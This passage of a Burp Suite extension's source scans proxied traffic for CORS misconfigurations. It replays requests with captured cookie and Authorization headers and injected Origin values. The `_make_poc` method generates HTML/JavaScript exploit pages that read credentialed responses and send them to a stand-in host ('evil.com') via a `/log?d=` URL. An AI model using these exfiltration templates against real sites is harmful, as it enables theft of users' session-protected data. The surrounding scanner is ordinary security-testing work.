        for a in (self._ta_oreq, self._ta_oresp, self._ta_treq,
                  self._ta_tresp, self._diff_left, self._diff_right):
            a.setText("")
        with self._seen_lock:
            self._seen = set()
            self._finding_keys = set()
        with self._host_auth_lock:
            self._host_auth = {}
        self._refresh_stats()
        self._log("Cleared.")

    # ---- import existing proxy history --------------------------------------
    def _on_import_history(self, ev):
        # Pull everything already in Burp's Proxy history and queue it, so the
        # tool works even when you browsed BEFORE pressing Start.
        if self._state == "STOPPED":
            self._stop_flag.clear()
            self._pause_event.set()
            try:
                self._limiter.set_rate(int(self._tf_rpm.getText().strip() or "0"))
            except Exception:
                self._limiter.set_rate(0)
            self._set_state("RUNNING")
        self._ensure_worker()
        t = threading.Thread(target=self._import_history_worker)
        t.setDaemon(True)
        t.start()

    def _import_history_worker(self):
        try:
            hist = self._cb.getProxyHistory()
        except Exception as e:
            self._log("getProxyHistory failed: %s" % e)
            return
        if not hist:
            self._log("Proxy history is empty. Browse the target through Burp first.")
            return
        total = len(hist)
        self._log("Proxy history has %d item(s). Importing (dedup bypassed)..." % total)
        # Import is an explicit user action: clear the seen-set so history that
        # was previously dropped (e.g. under a wrong scope) can be scanned now.
        with self._seen_lock:
            self._seen = set()
        # diagnostic tally
        self._diag = {"scope": 0, "getonly": 0, "ws": 0, "dupe": 0, "queued": 0, "err": 0}
        count = 0
        for mi in hist:
            if self._stop_flag.is_set():
                break
            try:
                self._enqueue(mi, diag=True)
                count += 1
            except Exception:
                self._diag["err"] += 1
        d = self._diag
        self._log("Import summary of %d item(s): queued=%d, "
                  "dropped[out-of-scope=%d, non-GET=%d, websocket=%d, duplicate=%d, error=%d]."
                  % (total, d["queued"], d["scope"], d["getonly"], d["ws"], d["dupe"], d["err"]))
        if d["queued"] == 0 and d["scope"] == total:
            self._log("ALL items were out of scope. Either define Target>Scope to include the "
                      "target, or UNTICK 'Only in-scope targets'.")

    # ---- background auto-poll of proxy history ------------------------------
    def _start_poller(self):
        self._poller_stop = threading.Event()
        t = threading.Thread(target=self._poll_history_loop)
        t.setDaemon(True)
        t.start()
        self._poller = t

    def _poll_history_loop(self):
        # Periodically scan Burp's proxy history for items we haven't seen yet.
        # This gives continuous auto-refresh: browse before OR after Start, the
        # tool still picks the traffic up. De-dup in _enqueue prevents rescans.
        last_len = 0
        while not self._poller_stop.is_set():
            try:
                if (self._state == "RUNNING"
                        and self._cb_autopoll.isSelected()):
                    hist = None
                    try:
                        hist = self._cb.getProxyHistory()
                    except Exception:
                        hist = None
                    if hist is not None:
                        n = len(hist)
                        if n > last_len:
                            # only feed the new tail
                            for mi in hist[last_len:n]:
                                if self._stop_flag.is_set():
                                    break
                                try:
                                    self._enqueue(mi)
                                except Exception:
                                    pass
                            last_len = n
                        elif n < last_len:
                            last_len = n  # history cleared/rotated
            except Exception:
                pass
            time.sleep(3.0)

    # ---- HTTP listener ------------------------------------------------------
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            return
        if self._state not in ("RUNNING", "PAUSED"):
            return
        # Only react to Proxy traffic. Our own makeHttpRequest calls are tagged
        # TOOL_EXTENDER, so this guard is what prevents an infinite scan loop.
        if toolFlag != self._TOOL_PROXY:
            return
        try:
            self._enqueue(messageInfo)
        except Exception as e:
            self._log("enqueue error: %s" % e)

    def _enqueue(self, messageInfo, diag=False):
        try:
            svc = messageInfo.getHttpService()
            info = self._helpers.analyzeRequest(messageInfo)
            url = info.getUrl()
            method = info.getMethod()
        except Exception as e:
            if diag: self._diag["err"] += 1
            return
        if url is None or svc is None:
            if diag: self._diag["err"] += 1
            return

        if self._cb_getonly.isSelected() and method != "GET":
            if diag: self._diag["getonly"] += 1
            return
        if self._cb_scope.isSelected() and not self._url_in_scope(url, svc, info):
            if diag: self._diag["scope"] += 1
            return

        # Skip WebSocket handshakes / protocol upgrades — they can't carry a
        # CORS policy, so probing them just wastes the request budget.
        try:
            for h in info.getHeaders():
                hl = h.lower()
                if hl.startswith("upgrade:") and "websocket" in hl:
                    if diag: self._diag["ws"] += 1
                    self._log("Skipped %s — WebSocket upgrade request (no CORS policy possible)."
                              % str(url))
                    return
                if hl.startswith("sec-websocket-key:"):
                    if diag: self._diag["ws"] += 1
                    self._log("Skipped %s — WebSocket upgrade request (no CORS policy possible)."
                              % str(url))
                    return
        except Exception:
            pass

        key = "%s|%s|%s" % (svc.getHost(), self._path_template(url), method)
        with self._seen_lock:
            if key in self._seen:
                if diag: self._diag["dupe"] += 1
                return
            self._seen.add(key)

        if diag: self._diag["queued"] += 1

        # remember auth headers for this host (for authenticated JS probes)
        try:
            self._remember_auth(svc.getHost(), messageInfo.getRequest())
        except Exception:
            pass

        hist_row = {"method": method, "url": str(url),
                    "target": "Origin header", "status": "Queued",
                    "orig_req": messageInfo.getRequest(),
                    "orig_resp": messageInfo.getResponse(),
                    "tested_req": None, "tested_resp": None,
                    "host": svc.getHost(), "port": svc.getPort(),
                    "proto": svc.getProtocol(), "url_obj": url}
        hidx = self._hist.add_row(hist_row)

        item = {
            "host": svc.getHost(), "port": svc.getPort(),
            "proto": svc.getProtocol(),
            "request": messageInfo.getRequest(),
            "response": messageInfo.getResponse(),
            "url": url, "url_str": str(url), "method": method, "hidx": hidx,
        }
        with self._queue_lock:
            self._queue.append(item)
        self._refresh_stats()

        # ---- JS endpoint extraction ------------------------------------
        if self._cb_jsextract.isSelected():
            try:
                self._maybe_extract_js(messageInfo, url)
            except Exception as e:
                self._log("JS extract error: %s" % e)

    def _is_javascript(self, respBytes, url):
        if respBytes is None:
            return False
        try:
            info = self._helpers.analyzeResponse(respBytes)
            for h in info.getHeaders():
                hl = h.lower()
                if hl.startswith("content-type:"):
                    if "javascript" in hl or "ecmascript" in hl:
                        return True
                    # explicit non-JS content types -> stop
                    if "text/html" in hl or "application/json" in hl:
                        # still allow if the URL clearly ends in .js
                        break
        except Exception:
            pass
        try:
            path = (url.getPath() or "").lower()
            if path.endswith(".js") or path.endswith(".mjs"):
                return True
        except Exception:
            pass
        return False

    def _maybe_extract_js(self, messageInfo, js_url):
        respBytes = messageInfo.getResponse()
        if not self._is_javascript(respBytes, js_url):
            return
        info = self._helpers.analyzeResponse(respBytes)
        body = respBytes[info.getBodyOffset():]
        js_text = self._helpers.bytesToString(body)
        # cap scanned size: minified bundles can be several MB; 2MB is plenty
        # to catch endpoint literals without stalling the worker.
        if len(js_text) > 2000000:
            js_text = js_text[:2000000]
        raw = extract_js_endpoints(js_text)
        if not raw:
            return

        svc = messageInfo.getHttpService()
        base_scheme = svc.getProtocol()
        base_host = svc.getHost()
        base_reg = _reg_domain(base_host)
        same_only = self._cb_jssamedomain.isSelected()

        added = 0
        for cand in raw:
            target = self._resolve_endpoint(cand, base_scheme, base_host)
            if target is None:
                continue
            (t_scheme, t_host, t_port, t_path) = target
            # scope: same registrable domain?
            if same_only and _reg_domain(t_host) != base_reg:
                continue
            # honour Burp scope toggle as well
            try:
                from java.net import URL as JURL
                full = "%s://%s:%d%s" % (t_scheme, t_host, t_port, t_path)
                if self._cb_scope.isSelected() and not self._cb.isInScope(JURL(full)):
                    continue
            except Exception:
                pass
            if self._enqueue_synthetic(t_scheme, t_host, t_port, t_path, js_url):
                added += 1
        if added:
            self._log("JS %s -> queued %d endpoint(s) for CORS testing"
                      % (base_host, added))

    def _resolve_endpoint(self, cand, base_scheme, base_host):
        """Return (scheme, host, port, path_with_query) or None."""
        cand = cand.strip()
        try:
            if cand.startswith("//"):
                cand = base_scheme + ":" + cand
            if cand.startswith("http://") or cand.startswith("https://"):
                m = re.match(r"^(https?)://([^/:]+)(?::(\d+))?(/[^\s]*)?$", cand)
                if not m:
                    return None
                scheme = m.group(1)
                host = m.group(2)
                port = int(m.group(3)) if m.group(3) else (443 if scheme == "https" else 80)
                path = m.group(4) or "/"
                return (scheme, host, port, path)
            else:
                # relative path -> resolve against base host
                if not cand.startswith("/"):
                    cand = "/" + cand
                port = 443 if base_scheme == "https" else 80
                return (base_scheme, base_host, port, cand)
        except Exception:
            return None

    def _enqueue_synthetic(self, scheme, host, port, path, source_js):
        # de-dupe
        key = "%s|%s|GET|JS" % (host, self._path_template_str(path))
        with self._seen_lock:
            if key in self._seen:
                return False
            self._seen.add(key)
        # build a GET request, reusing captured auth headers for this host so
        # the credentialed-CORS check is meaningful (browser would send them)
        with self._host_auth_lock:
            auth_headers = list(self._host_auth.get(host, []))
        req_line = "GET %s HTTP/1.1\r\n" % path
        base = (req_line +
                "Host: %s\r\n" % host +
                "User-Agent: CORS-Auto-Hunter\r\n" +
                "Accept: */*\r\n")
        for ah in auth_headers:
            base += ah + "\r\n"
        headers = base + "Connection: close\r\n\r\n"
        req_bytes = self._helpers.stringToBytes(headers)
        try:
            from java.net import URL as JURL
            url = JURL("%s://%s:%d%s" % (scheme, host, port, path))
        except Exception:
            url = None
        hist_row = {"method": "GET", "url": "%s://%s%s" % (scheme, host, path),
                    "target": "JS_EXTRACTED", "status": "Queued",
                    "orig_req": req_bytes, "orig_resp": None,
                    "tested_req": None, "tested_resp": None,
                    "host": host, "port": port, "proto": scheme, "url_obj": url}
        hidx = self._hist.add_row(hist_row)
        item = {
            "host": host, "port": port, "proto": scheme,
            "request": req_bytes, "response": None,
            "url": url, "url_str": "%s://%s%s" % (scheme, host, path),
            "method": "GET", "hidx": hidx,
            "source": "JS:%s" % source_js,
        }
        with self._queue_lock:
            self._queue.append(item)
        self._refresh_stats()
        return True

    def _path_template_str(self, path):
        return re.sub(r"/\d+", "/{id}", path or "/")

    def _remember_auth(self, host, req_bytes):
        if req_bytes is None:
            return
        analyzed = self._helpers.analyzeRequest(req_bytes)
        auth = []
        for h in analyzed.getHeaders():
            hl = h.lower()
            if hl.startswith("cookie:") or hl.startswith("authorization:"):
                auth.append(h)
        if auth:
            with self._host_auth_lock:
                self._host_auth[host] = auth

    def _path_template(self, url):
        p = url.getPath() or "/"
        # keep the query in the dedup key (collapsing only numeric IDs) so that
        # /api/data?id=1 and /search?q=x are treated as distinct endpoints and
        # both get scanned — otherwise many real endpoints get dropped.
        try:
            q = url.getQuery()
        except Exception:
            q = None
        if q:
            p = p + "?" + q
        return re.sub(r"/\d+", "/{id}", p)

    # ---- context menu -------------------------------------------------------
    def createMenuItems(self, invocation):
        menu = ArrayList()
        item = JMenuItem("CORS Auto-Hunter: scan this now",
                         actionPerformed=lambda ev, inv=invocation: self._scan_selected(inv))
        menu.add(item)
        return menu

    def _scan_selected(self, invocation):
        msgs = invocation.getSelectedMessages()
        if not msgs:
            return
        # Ensure a worker is running so ad-hoc items flow through the same
        # single-queue pipeline (respecting rate limit and STOP) instead of
        # spawning one unbounded thread per selected message.
        if self._state == "STOPPED":
            self._stop_flag.clear()
            self._pause_event.set()
            try:
                self._limiter.set_rate(int(self._tf_rpm.getText().strip() or "0"))
            except Exception:
                self._limiter.set_rate(0)
            self._set_state("RUNNING")
        self._ensure_worker()
        queued = 0
        for m in msgs:
            svc = m.getHttpService()
            info = self._helpers.analyzeRequest(m)
            hist_row = {"method": info.getMethod(), "url": str(info.getUrl()),
                        "target": "Origin header", "status": "Queued",
                        "orig_req": m.getRequest(), "orig_resp": m.getResponse(),
                        "tested_req": None, "tested_resp": None,
                        "host": svc.getHost(), "port": svc.getPort(),
                        "proto": svc.getProtocol(), "url_obj": info.getUrl()}
            hidx = self._hist.add_row(hist_row)
            item = {"host": svc.getHost(), "port": svc.getPort(),
                    "proto": svc.getProtocol(), "request": m.getRequest(),
                    "response": m.getResponse(), "url": info.getUrl(),
                    "url_str": str(info.getUrl()),
                    "method": info.getMethod(), "hidx": hidx}
            with self._queue_lock:
                self._queue.append(item)
            queued += 1
        self._refresh_stats()
        self._log("Ad-hoc scan queued %d item(s)." % queued)

    # ---- worker -------------------------------------------------------------
    def _run_worker(self):
        self._log("Worker started. Waiting for queue items...")
        idle_logged = False
        while not self._stop_flag.is_set():
            self._pause_event.wait()
            if self._stop_flag.is_set():
                break
            limit = self._get_int(self._tf_limit, 0)
            if limit > 0 and self._sent_count >= limit:
                self._log("Request limit (%d) reached; pausing." % limit)
                self._pause_event.clear()
                self._set_state("PAUSED")
                continue
            item = None
            with self._queue_lock:
                qlen = len(self._queue)
                if self._queue:
                    item = self._queue.pop(0)
            if item is None:
                if not idle_logged and qlen == 0:
                    idle_logged = True
                time.sleep(0.4)
                continue
            idle_logged = False
            self._log("Worker picked item: %s (queue now %d)" %
                      (item.get("url_str", "?"), qlen - 1))
            try:
                self._process_item(item)
            except Exception as e:
                self._log("process error on %s: %s" % (item.get("url_str", "?"), e))
                hidx = item.get("hidx", -1)
                if hidx >= 0:
                    self._hist.update_status(hidx, "Error")
            self._refresh_stats()
        self._log("Worker exited.")

    def _get_int(self, tf, default):
        try:
            return int(tf.getText().strip())
        except Exception:
            return default

    # ---- core ---------------------------------------------------------------
    def _process_item(self, item):
        evil = self._tf_evil.getText().strip() or "evil.com"
        scheme = item["proto"]
        host = item["host"]
        hidx = item.get("hidx", -1)
        techniques = build_techniques(scheme, host, evil)

        if hidx >= 0:
            self._hist.update_status(hidx, "Scanning")
        self._log("Scanning %s with %d techniques..." %
                  (item.get("url_str", host), len(techniques)))

        # Baseline request must also respect the rate limit and be counted,
        # otherwise the total-limit is inaccurate and one request/endpoint
        # bypasses the throttle.
        self._limiter.acquire()
        baseline_acao, _, baseline_resp, baseline_status = self._send_with_origin(item, None)
        with self._count_lock:
            self._sent_count += 1

        # If the baseline got no response at all, the host is unreachable or
        # the endpoint is dead. Skip the remaining 40+ probes to save the
        # request budget and avoid flooding the log.
        if baseline_resp is None:
            if hidx >= 0:
                self._hist.update_status(hidx, "No response")
            self._log("No response from %s (host down / timeout) — skipped."
                      % item.get("url_str", host))
            return

        # If the plain request already returns rate-limit / server-error, don't
        # pile 42 more requests on top — mark it and move on.
        if baseline_status in (429, 503):
            if hidx >= 0:
                self._hist.update_status(hidx, "Server %d (skipped)" % baseline_status)
            self._log("Baseline on %s returned %d — server busy/limiting; skipped scanning."
                      % (item.get("url_str", host), baseline_status))
            return

        # record the baseline (no Origin injected) as the first probe entry
        if hidx >= 0:
            brow = self._hist.get(hidx)
            if brow is not None:
                brow.setdefault("probes", []).append({
                    "tid": "BASE", "name": "baseline (no Origin)",
                    "origin": "(none)", "acao": baseline_acao,
                    "acac": "-",
                    "req": self._build_request_with_origin(item, None),
                    "resp": baseline_resp,
                })

        found_here = False
        stopped = False
        applied = 0
        any_acao = None
        consec_fail = 0
        total = len(techniques)
        short_url = item.get("url_str", "")
        if len(short_url) > 55:
            short_url = "..." + short_url[-52:]
        for idx, tech in enumerate(techniques, 1):
            if self._stop_flag.is_set():
                stopped = True
                break
            self._pause_event.wait()
            if self._stop_flag.is_set():
                stopped = True
                break
            limit = self._get_int(self._tf_limit, 0)
            if limit > 0 and self._sent_count >= limit:
                stopped = True
                break
            self._limiter.acquire()
            acao, acac, tested_resp, status = self._send_with_origin(item, tech["origin"])
            applied += 1
            # ---- server-distress handling --------------------------------
            # Track consecutive failures / rate-limit / server-error responses.
            if status == -1:
                consec_fail += 1
            elif status in (429, 503):
                # server is rate-limiting or overloaded: back off, don't hammer
                self._log("Server returned %d on %s — backing off 5s and pausing this endpoint."
                          % (status, short_url))
                try:
                    time.sleep(5.0)
                except Exception:
                    pass
                stopped = True
                if hidx >= 0:
                    self._hist.update_status(hidx, "Server %d (backed off)" % status)
                break
            elif status >= 500:
                consec_fail += 1
            else:
                consec_fail = 0
            # if many probes in a row fail, the endpoint/host is likely down
            if consec_fail >= 5:
                self._log("5 consecutive failures on %s — aborting remaining techniques."
                          % short_url)
                stopped = True
                if hidx >= 0:
                    self._hist.update_status(hidx, "Aborted (server errors)")
                break
            # verbose: prove each technique is sent (toggle with the checkbox)
            if self._cb_verbose.isSelected():
                self._log("  [%d/%d] %s  Origin: %s  ->  ACAO: %s" %
                          (idx, total, tech["id"], tech["origin"],
                           acao if acao is not None else "(none)"))
            if acao is not None and any_acao is None:
                any_acao = acao
            with self._count_lock:
                self._sent_count += 1
            # Record EVERY technique probe on the history row so the UI can show
            # all 42 (+baseline/preflight) attempts per endpoint, not just one.
            if hidx >= 0:
                row = self._hist.get(hidx)
                if row is not None:
                    treq = self._build_request_with_origin(item, tech["origin"])
                    probe = {
                        "tid": tech["id"], "name": tech["name"],
                        "origin": tech["origin"], "acao": acao,
                        "acac": "true" if acac else ("false" if acao is not None else "-"),
                        "req": treq, "resp": tested_resp,
                    }
                    row.setdefault("probes", []).append(probe)
                    # keep first successful pair as the default pane content
                    if row.get("tested_req") is None and tested_resp is not None:
                        row["tested_req"] = treq
                        row["tested_resp"] = tested_resp
            hit = self._judge(item, tech, acao, acac, baseline_acao, tested_resp)
            if hit:
                found_here = True
                if hidx >= 0:
                    self._hist.update_status(hidx, "Vulnerable - CORS",
                                             tech["id"] + " " + tech["name"])

        if (self._cb_preflight.isSelected() and not self._stop_flag.is_set()
                and not stopped):
            self._limiter.acquire()
            self._preflight_probe(item, evil)
            with self._count_lock:
                self._sent_count += 1

        if hidx >= 0 and not found_here:
            self._hist.update_status(hidx, "Stopped" if stopped else "Complete")

        # Transparent per-endpoint summary so it's clear techniques ran even
        # when there's no finding (e.g. static assets legitimately have no CORS).
        if not found_here and not stopped:
            short = item.get("url_str", "")
            if len(short) > 70:
                short = short[:70] + "..."
            if any_acao is None:
                self._log("Scanned %s — %d techniques applied, no ACAO header in any response (not CORS-enabled)."
                          % (short, applied))
            else:
                self._log("Scanned %s — %d techniques applied; server returned ACAO '%s' but not attacker-controlled (no vuln)."
                          % (short, applied, any_acao))

    def _build_request_with_origin(self, item, origin):
        req = item["request"]
        analyzed = self._helpers.analyzeRequest(req)
        headers = list(analyzed.getHeaders())
        body = req[analyzed.getBodyOffset():]
        new_headers = [h for h in headers if not h.lower().startswith("origin:")]
        if origin is not None:
            new_headers.append("Origin: " + origin)
        return self._helpers.buildHttpMessage(new_headers, body)

    def _send_with_origin(self, item, origin):
        new_req = self._build_request_with_origin(item, origin)
        http_service = self._make_service(item)
        try:
            resp = self._cb.makeHttpRequest(http_service, new_req)
            rbytes = resp.getResponse()
            if rbytes is None:
                # None response = connection failed / timed out / host down
                return (None, False, None, -1)
            acao, acac = self._parse_cors(rbytes)
            status = self._status_of(rbytes)
            return (acao, acac, rbytes, status)
        except Exception as e:
            self._log("send error to %s: %s" % (item["host"], e))
            return (None, False, None, -1)

    def _status_of(self, respBytes):
        try:
            info = self._helpers.analyzeResponse(respBytes)
            return info.getStatusCode()
        except Exception:
            return 0

    def _make_service(self, item):
        return self._helpers.buildHttpService(item["host"], item["port"],
                                              item["proto"] == "https")

    def _url_in_scope(self, url, svc, info):
        # Burp's isInScope() can reject the URL that analyzeRequest() returns for
        # a proxy-history item (explicit :443/:80, trailing differences, etc.).
        # Try several equivalent forms and accept if ANY is in scope.
        candidates = []
        try:
            if url is not None:
                candidates.append(url)
        except Exception:
            pass
        # rebuild from the http service + path
        try:
            from java.net import URL as JURL
            proto = svc.getProtocol()
            host = svc.getHost()
            port = svc.getPort()
            path = "/"
            try:
                path = info.getUrl().getFile() or "/"
            except Exception:
                path = "/"
            # form without explicit default port
            candidates.append(JURL("%s://%s%s" % (proto, host, path)))
            # form with explicit port
            candidates.append(JURL("%s://%s:%d%s" % (proto, host, port, path)))
            # bare host root
            candidates.append(JURL("%s://%s/" % (proto, host)))
        except Exception:
            pass
        for c in candidates:
            try:
                if self._cb.isInScope(c):
                    return True
            except Exception:
                pass
        return False

    def _parse_cors(self, respBytes):
        info = self._helpers.analyzeResponse(respBytes)
        acao = None
        acac = False
        for h in info.getHeaders():
            hl = h.lower()
            if hl.startswith("access-control-allow-origin:"):
                acao = h.split(":", 1)[1].strip()
            elif hl.startswith("access-control-allow-credentials:"):
                acac = h.split(":", 1)[1].strip().lower() == "true"
        return (acao, acac)

    def _judge(self, item, tech, acao, acac, baseline_acao, tested_resp):
        if acao is None:
            return False
        origin = tech["origin"]
        kind = tech["kind"]
        hit = False
        sev = "INFO"

        acao_l = acao.strip().lower()
        origin_l = origin.strip().lower()
        base_l = (baseline_acao or "").strip().lower()

        if kind == "null":
            if acao_l == "null":
                hit = True
                sev = "HIGH" if acac else "MEDIUM"
        elif kind == "wildcard":
            if acao_l == "*":
                hit = True
                sev = "MEDIUM" if acac else "LOW"
        else:
            own_https = ("https://%s" % item["host"]).lower()
            own_http = ("http://%s" % item["host"]).lower()
            injected_is_self = origin_l in (own_https, own_http)
            # server echoed exactly the origin we injected (case-insensitive)
            if acao_l == origin_l and not injected_is_self:
                hit = True
                sev = "HIGH" if acac else "MEDIUM"
            elif acao_l == origin_l and injected_is_self and base_l != origin_l:
                hit = True
                sev = "HIGH" if acac else "MEDIUM"

        # A bare wildcard on any technique is still worth surfacing.
        if not hit and acao_l == "*":
            hit = True
            sev = "MEDIUM" if acac else "LOW"
            tech = dict(tech); tech["name"] = tech["name"] + " (wildcard *)"

        if not hit:
            return False

        # ---- collapse near-duplicate findings for the same endpoint ----
        # A blanket-reflecting server would otherwise fire all ~40 reflect
        # techniques and flood the table. Key on host+path+severity+family
        # so we keep one representative per distinct class.
        family = "null" if kind == "null" else ("wild" if "*" in acao_l else "reflect")
        try:
            ptmpl = self._path_template_str((item.get("url").getPath()
                                             if item.get("url") else
                                             item.get("url_str", "")))
        except Exception:
            ptmpl = item.get("url_str", "")
        dkey = "%s|%s|%s|%s" % (item["host"], ptmpl, sev, family)
        with self._seen_lock:
            if dkey in self._finding_keys:
                return True   # already reported this class for this endpoint
            self._finding_keys.add(dkey)

        self._populate_panes(item, origin, tested_resp)

        poc = self._make_poc(item, origin, acac, acao)
        row = {
            "sev": sev, "host": item["host"],
            "tname": "%s %s" % (tech["id"], tech["name"]),
            "origin": origin, "acao": acao,
            "acac": "true" if acac else "false",
            "url": item.get("url_str", str(item.get("url"))), "method": item["method"], "poc": poc,
            "orig_req": item["request"], "orig_resp": item.get("response"),
            "tested_req": self._build_request_with_origin(item, origin),
            "tested_resp": tested_resp,
        }
        self._findings.add(row)
        self._cb.issueAlert("[CORS %s] %s  %s" % (sev, item["host"], tech["name"]))
        self._log("FINDING %s  %s  <- Origin: %s  (ACAC=%s)" %
                  (sev, item["host"], origin, "true" if acac else "false"))
        self._refresh_stats()
        return True

    def _populate_panes(self, item, origin, tested_resp):
        try:
            oreq = self._helpers.bytesToString(item["request"]) if item["request"] else ""
            oresp = self._helpers.bytesToString(item["response"]) if item.get("response") else "(no original response captured)"
            treq = self._helpers.bytesToString(self._build_request_with_origin(item, origin))
            tresp = self._helpers.bytesToString(tested_resp) if tested_resp else ""
            SwingUtilities.invokeLater(_SetText(self._ta_oreq, oreq))
            SwingUtilities.invokeLater(_SetText(self._ta_oresp, oresp))
            SwingUtilities.invokeLater(_SetText(self._ta_treq, treq))
            SwingUtilities.invokeLater(_SetText(self._ta_tresp, tresp))
            self._render_diff(oreq, treq, oresp, tresp)
        except Exception as e:
            self._log("pane error: %s" % e)

    def _render_diff(self, oreq, treq, oresp, tresp):
        left = (oreq or "") + "\n\n--- RESPONSE ---\n" + (oresp or "")
        right = (treq or "") + "\n\n--- RESPONSE ---\n" + (tresp or "")
        lset = set(left.splitlines())
        rset = set(right.splitlines())
        left_marked = []
        for ln in left.splitlines():
            mark = "  " if ln in rset else "- "
            left_marked.append(mark + ln)
        right_marked = []
        for ln in right.splitlines():
            mark = "  " if ln in lset else "+ "
            right_marked.append(mark + ln)
        SwingUtilities.invokeLater(_SetText(self._diff_left, "\n".join(left_marked)))
        SwingUtilities.invokeLater(_SetText(self._diff_right, "\n".join(right_marked)))

    def _preflight_probe(self, item, evil):
        req = item["request"]
        analyzed = self._helpers.analyzeRequest(req)
        headers = list(analyzed.getHeaders())
        if not headers:
            return
        first = headers[0].split(" ")
        if len(first) >= 3:
            first[0] = "OPTIONS"
            headers[0] = " ".join(first)
        headers = [h for h in headers if not h.lower().startswith("origin:")
                   and not h.lower().startswith("access-control-request")
                   and not h.lower().startswith("content-length")
                   and not h.lower().startswith("content-type")]
        headers.append("Origin: https://" + evil)
        headers.append("Access-Control-Request-Method: PUT")
        headers.append("Access-Control-Request-Headers: X-Test-Header")
        new_req = self._helpers.buildHttpMessage(headers, self._helpers.stringToBytes(""))
        try:
            resp = self._cb.makeHttpRequest(self._make_service(item), new_req)
            rbytes = resp.getResponse()
            if rbytes is None:
                return
            info = self._helpers.analyzeResponse(rbytes)
            acao = acam = acah = None
            vary_origin = False
            for h in info.getHeaders():
                hl = h.lower()
                if hl.startswith("access-control-allow-origin:"):
                    acao = h.split(":", 1)[1].strip()
                elif hl.startswith("access-control-allow-methods:"):
                    acam = h.split(":", 1)[1].strip()
                elif hl.startswith("access-control-allow-headers:"):
                    acah = h.split(":", 1)[1].strip()
                elif hl.startswith("vary:") and "origin" in hl:
                    vary_origin = True
            notes = []
            if acao == ("https://" + evil):
                notes.append("pre-flight reflects attacker origin")
            if acam and re.search(r"PUT|DELETE|PATCH", acam, re.I):
                notes.append("dangerous methods allowed: %s" % acam)
            if acah and ("*" in acah or "x-test-header" in acah.lower()):
                notes.append("permissive allow-headers: %s" % acah)
            if acao and acao != "*" and not vary_origin:
                notes.append("missing 'Vary: Origin' (cache-poisoning risk)")
            if notes:
                row = {
                    "sev": "INFO", "host": item["host"],
                    "tname": "PF Pre-flight surface",
                    "origin": "https://" + evil, "acao": acao or "-", "acac": "-",
                    "url": item.get("url_str", str(item.get("url"))), "method": "OPTIONS",
                    "poc": "Pre-flight observations:\n - " + "\n - ".join(notes),
                    "orig_req": item["request"], "orig_resp": item.get("response"),
                    "tested_req": new_req, "tested_resp": rbytes,
                }
                self._findings.add(row)
                self._log("PRE-FLIGHT note @ %s: %s" % (item["host"], "; ".join(notes)))
        except Exception as e:
            self._log("preflight error: %s" % e)

    def _make_poc(self, item, origin, acac, acao):
        url = item.get("url_str", str(item.get("url")))
        evil = self._tf_evil.getText().strip() or "evil.com"
        creds = "true" if acac else "false"
        if acao and acao.lower() == "null":
            return (
                "<!-- null-origin PoC: sandboxed iframe -->\n"
                "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"\n"
                "<script>\n"
                " var r=new XMLHttpRequest();\n"
                " r.onload=function(){location='https://%s/log?d='+encodeURIComponent(r.responseText)};\n"
                " r.open('GET','%s',true); r.withCredentials=true; r.send();\n"
                "</script>\"></iframe>\n" % (evil, url)
            )
        return (
            "<!-- Serve from an origin resolving to: %s -->\n"
            "<!-- Allowed  ACAO=%s  ACAC=%s -->\n"
            "<script>\n"
            " var r=new XMLHttpRequest();\n"
            " r.onload=function(){location='https://%s/log?d='+encodeURIComponent(r.responseText)};\n"
            " r.open('%s','%s',true);\n"
            " r.withCredentials=%s;\n"
            " r.send();\n"
            "</script>\n" % (origin, acao, creds, evil, item["method"], url, creds)
        )

    # ---- selection handlers -------------------------------------------------
    def show_finding(self, rowIndex):
        row = self._findings.get(rowIndex)
        if row is None:
            return
        txt = []
        txt.append("Severity : %s" % row["sev"])
        txt.append("Host     : %s" % row["host"])
        txt.append("URL      : %s" % row["url"])
        txt.append("Method   : %s" % row["method"])
        txt.append("Technique: %s" % row["tname"])
        txt.append("Origin   : %s" % row["origin"])
        txt.append("ACAO     : %s" % row["acao"])
        txt.append("ACAC     : %s" % row["acac"])
        txt.append("")
        txt.append("---- Proof of Concept ----")
        txt.append(row["poc"])
        self._poc_area.setText("\n".join(txt))
        self._poc_area.setCaretPosition(0)
        try:
            oreq = self._helpers.bytesToString(row["orig_req"]) if row.get("orig_req") else ""
            oresp = self._helpers.bytesToString(row["orig_resp"]) if row.get("orig_resp") else "(no original response)"
            treq = self._helpers.bytesToString(row["tested_req"]) if row.get("tested_req") else ""
            tresp = self._helpers.bytesToString(row["tested_resp"]) if row.get("tested_resp") else ""
            self._ta_oreq.setText(oreq); self._ta_oreq.setCaretPosition(0)
            self._ta_oresp.setText(oresp); self._ta_oresp.setCaretPosition(0)
            self._ta_treq.setText(treq); self._ta_treq.setCaretPosition(0)
            self._ta_tresp.setText(tresp); self._ta_tresp.setCaretPosition(0)
            self._render_diff(oreq, treq, oresp, tresp)
        except Exception as e:
            self._log("show_finding error: %s" % e)

    def show_history(self, rowIndex):
        row = self._hist.get(rowIndex)
        if row is None:
            return
        self._cur_hist_row = row
        probes = row.get("probes", [])
        self._probes.set_rows(probes)
        self._log("History row %d: %s %s [%s] — %d technique probe(s) recorded."
                  % (rowIndex + 1, row["method"], row["url"], row["status"], len(probes)))
        try:
            oreq = self._helpers.bytesToString(row["orig_req"]) if row.get("orig_req") else "(no request captured)"
            oresp = self._helpers.bytesToString(row["orig_resp"]) if row.get("orig_resp") else "(no original response captured)"
            treq = self._helpers.bytesToString(row["tested_req"]) if row.get("tested_req") else "(not scanned yet — press START, or the endpoint had no response)"
            tresp = self._helpers.bytesToString(row["tested_resp"]) if row.get("tested_resp") else ""
            self._ta_oreq.setText(oreq); self._ta_oreq.setCaretPosition(0)
            self._ta_oresp.setText(oresp); self._ta_oresp.setCaretPosition(0)
            self._ta_treq.setText(treq); self._ta_treq.setCaretPosition(0)
            self._ta_tresp.setText(tresp); self._ta_tresp.setCaretPosition(0)
            self._render_diff(oreq, treq, oresp, tresp)
        except Exception as e:
            self._log("show_history error: %s" % e)

    def show_probe(self, probeIndex):
        # Fill the Req/Resp/Diff panes from one specific technique probe.
        p = self._probes.get(probeIndex)
        if p is None:
            return
        row = getattr(self, "_cur_hist_row", None)
        try:
            oreq = self._helpers.bytesToString(row["orig_req"]) if (row and row.get("orig_req")) else "(no original request)"
            oresp = self._helpers.bytesToString(row["orig_resp"]) if (row and row.get("orig_resp")) else "(no original response)"
            treq = self._helpers.bytesToString(p["req"]) if p.get("req") else "(request not stored)"
